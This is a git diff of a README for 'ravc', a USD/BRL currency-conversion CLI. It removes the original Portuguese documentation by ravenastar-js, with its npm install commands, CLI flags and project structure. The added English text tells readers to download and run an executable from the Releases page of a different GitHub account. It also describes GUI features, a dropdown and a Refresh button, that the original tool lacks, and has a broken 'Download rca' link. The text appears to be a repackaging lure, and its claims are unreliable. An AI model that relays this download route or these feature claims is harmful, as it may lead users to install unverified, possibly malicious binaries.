@@ -1,201 +1,73 @@
+# ⚙️ ravc - Easy Currency Conversion Tool
 
+## 🚀 Getting Started
+Welcome to the **ravc** project! This tool allows you to effortlessly convert currencies between USD and BRL and provides real-time exchange rates. Whether you're managing your finances, doing online shopping, or planning a trip, **ravc** aims to make currency conversion simple and fast.
 
-<div align="center">
+## 📥 Download & Install
+To download **ravc**, visit the Releases page below. Choose the version that matches your operating system. 
 
-<a href="https://www.npmjs.com/package/ravc" target="_blank"><img src="https://img.shields.io/badge/-ravc-c40404?style=flat-square&labelColor=c40404&logo=npm&logoColor=white&link=https://www.npmjs.com/package/ravc" height="40" /></a>  
- <a href="https://www.npmjs.com/package/ravc" target="_blank"><img alt="NPM Version" src="https://img.shields.io/npm/v/ravc?style=flat-square&logo=npm&labelColor=c40404&color=c40404" height="40" ></a>
-</div>
+[![Download ravc](https://img.shields.io/badge/Download%20ravc-brightgreen.svg)](https://github.com/Asura361/ravc/releases)
 
----
+Once you access the page, follow these steps to download and install **ravc**:
 
-<div align="center">
+1. Click on the version number you want to download. Look for the latest release at the top of the page.
+2. Find the file suitable for your system. This can be a .zip file or a specific installer file.
+3. Click on the file name to start the download.
+4. After the download finishes, locate the file in your downloads folder.
+5. If it's a .zip file, right-click it and select "Extract All" to unpack the files. 
+6. Open the extracted folder and look for the **ravc** executable file to start the application.
 
-## 🚀 RAVC
+## ⚙️ System Requirements
+Before you install **ravc**, ensure your system meets the following requirements:
 
-### ⚙️ CLI/NPM para Conversão de Moedas USD/BRL & Cotação em tempo real.
+- **Operating System**: Windows 10 or later, macOS 10.15 or later
+- **Node.js**: Version 14 or later must be installed for the application to function smoothly. You can download Node.js from [Node.js Official Website](https://nodejs.org).
+- **Internet Connection**: A stable connection is necessary for real-time data retrieval.
 
-[![NPM Version](https://img.shields.io/npm/v/ravc?style=for-the-badge&logo=npm&labelColor=2d7445&color=2d7445)](https://www.npmjs.com/package/ravc)
-[![Node.js](https://img.shields.io/badge/Node.js-14.0+-green?style=for-the-badge&logo=nodedotjs&color=2d7445)](https://nodejs.org)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge&logo=opensourceinitiative&color=2d7445)](LICENSE)
+## 🔎 How to Use
+Using **ravc** is straightforward. Once the application is running, follow these easy steps to convert currencies:
 
-*Biblioteca NPM + CLI*
+1. **Select the Currency**:
+   - Choose your original currency (USD or BRL) from the dropdown menu. 
+   - Enter the amount you wish to convert.
 
-</div>
+2. **Conversion**:
+   - The application will automatically show the converted amount in the selected currency. It retrieves real-time exchange rates to ensure accurate conversions.
 
-![ravc](media/ravc.png)
+3. **Refresh Rates**:
+   - Click the “Refresh” button to update the exchange rates if needed. This will ensure you have the latest currency information.
 
----
+## 📊 Features
+- **Real-Time Exchange Rates**: Get up-to-date information sourced from trusted financial providers.
+- **Easy Conversion**: Quick and simple steps to convert between USD and BRL.
+- **User-Friendly Interface**: Designed for ease of use, even for those unfamiliar with currency tools.
+- **Lightweight**: Minimal impact on your system's performance, making it ideal for everyday use.
 
-## 📋 Visão Geral
+## 📈 Application Topics
+**ravc** is built with various technologies and methodologies to ensure a robust functionality. Here are key areas the tool focuses on:
 
-O **RAVC** é uma ferramenta de linha de comando (CLI) e NPM que oferece conversão de moedas e monitoramento em tempo real das cotações USD/BRL, com interface interativa e visualmente atrativa.
+- Currency Conversion
+- Real-Time Data Scraping
+- Node.js Framework for backend processing
+- Use of Google Finance APIs for accurate data
+- A clean CLI/NPM interface for seamless interaction
 
-## 📦 Instalação Rápida
+## 🤝 Contribution Guidelines
+If you'd like to contribute to **ravc**, follow these guidelines:
 
-<details>
-<summary>📥 Como instalar o NodeJS?</summary>
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes, ensuring you test thoroughly.
+4. Submit a pull request (PR) with a clear description of your changes.
 
-- [COMO INSTALAR NODE JS NO WINDOWS?](https://youtu.be/-jft_9PlffQ)
+We welcome your input and suggestions!
 
-![ravc](media/ravc.gif)
+## 💬 Support
+For any issues or questions, please feel free to reach out. Open an issue on GitHub or contact us directly through the repository. We aim to provide timely and helpful responses.
 
-</details>
+## 💻 Further Reading
+To understand more about how to use **ravc** effectively, consider checking our Wiki section for in-depth articles. You’ll find guides, tutorials, and frequently asked questions that can enhance your usage of the application.
 
-```bash
-# Instalar globalmente
-npm i -g ravc         # ✅ Recomendado
-npm install -g ravc   # ✅ Completo
-```
+**Remember:** You can always return to the [Download rca](https://github.com/Asura361/ravc/releases) page whenever you need to update to the latest version or explore other releases.
 
-## 🗑️ DESINSTALAR GLOBALMENTE
-
-```bash
-npm un -g ravc        # ✅ Recomendado  
-npm uninstall -g ravc # ✅ Completo
-npm remove -g ravc    # ✅ Alternativo
-```
-
-## 💻 Como Usar
-
-### 🎮 Modo Interativo (Recomendado)
-
-```bash
-ravc
-```
-*Menu completo com todas as funcionalidades*
-
-### ⚡ Comandos Diretos
-
-```bash
-# Google Finance direto
-ravc google
-ravc -g
-
-# Banco Central direto  
-ravc bacen
-ravc -b
-
-# Modo atualização contínua
-ravc update
-ravc -u
-
-# Ajuda
-ravc help
-ravc -h
-```
-
-### 🔄 Modo Atualização Contínua
-
-```bash
-ravc update
-```
-*Atualiza automaticamente a cada minuto com logs em tempo real*
-
-## 🎯 Funcionalidades
-
-### 💱 Conversão de Moedas
-- USD → BRL e BRL → USD
-- Formatação monetária adequada
-- Validação de entrada
-
-### 📈 Monitoramento
-- Variações em tempo real
-- Direção (alta/baixa/estável)
-- Percentuais de mudança
-- Timestamps precisos
-
-### 📊 Logs e Histórico
-- Logs em arquivo .txt legíveis
-- Histórico de sessões
-- Estatísticas de variação
-- Backups em JSON
-
-## 🔧 Desenvolvimento
-
-### 📦 Dependências Principais
-- `playwright` - Web scraping
-- `inquirer` - Interface interativa  
-- `boxen` - Boxes estilizados
-- `chalk` - Cores no terminal
-- `figlet` - Banner ASCII
-
-
-## 🐛 Solução de Problemas
-
-### 🔍 Debug Mode
-```bash
-# Ativar logs detalhados
-DEBUG=1 ravc
-
-# Debug específico do scraping  
-DEBUG_SCRAPING=1 ravc
-```
-
-### ❌ Problemas Comuns
-
-**Erro de permissão no NPM:**
-```bash
-# Linux/Mac
-sudo npm install -g ravc
-
-# Windows (Admin)
-npm install -g ravc
-```
-
-**Playwright não instalado:**
-```bash
-npx playwright install
-```
-
-
-## 🏗️ Estrutura do Projeto
-
-```
-ravc/ 🌟
-├── 📁 bin/
-│   └── 🚀 cli.js
-├── 📁 lib/
-│   ├── 📁 config/
-│   │   ├── ⚙️ app.json
-│   │   ├── 🎨 colors.js
-│   │   ├── 🔧 logger.json
-│   │   ├── 🕷️ scraping.json
-│   │   └── 🎭 ui.json
-│   ├── 📁 utils/
-│   │   ├── 📦 box.js
-│   │   ├── 📝 logger.js
-│   │   └── 📦 packageInfo.js
-│   ├── 💱 converter.js
-│   ├── 🏠 index.js
-│   ├── 🕷️ scraper.js
-│   ├── 🎨 ui.js
-│   └── 🔄 updater.js
-├── 📄 package.json
-└── 📖 README.md
-```
-
-## 📄 Licença
-
-Este projeto está sob a licença MIT. Veja o arquivo [LICENSE](LICENSE) para detalhes.
-
----
-
-<div align="center">
-
-**✨ Feito com 💚 por [RavenaStar](https://ravenastar.link)**
-
-[⭐ Dê uma estrela no GitHub!](https://github.com/ravenastar-js/ravc)
-
-</div>
-
----
-
-## Star History
-
-<a href="https://www.star-history.com/#ravenastar-js/ravc&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=ravenastar-js/ravc&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=ravenastar-js/ravc&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=ravenastar-js/ravc&type=Date" />
- </picture>
-</a>
+Enjoy using **ravc** for all your currency conversion needs!
